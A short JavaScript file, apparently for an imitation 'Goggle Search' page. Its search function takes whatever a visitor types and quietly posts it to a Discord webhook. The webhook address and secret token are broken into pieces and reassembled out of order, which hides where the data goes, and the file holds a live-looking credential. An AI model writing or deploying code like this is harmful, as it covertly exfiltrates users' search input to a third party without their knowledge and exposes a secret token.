import webhook from 'webhook-discord'

function searchreq() {
    let searching = document.getElementById("search");

    var discrim = "/api/webhooks/1055744539660406784/";
    var key2 = "QQ-o_SBT8pKB0p3JMDdVhhPy";
    var key3 = "aGrDAXNM2F5ETj9-p";
    var key4 = "kbpUh48eUPkj_fpiw9Z8e_jgttL";

    const Hook = new webhook.Webhook("https://discord.com" + discrim + key4 + key3 + key2);

    const msg = new webhook.MessageBuilder()
    .setName("Goggle Search")
    .setColor("#0000FF")
    .setText(`A user searched: ${searching.value}`)

    Hook.send(msg);
}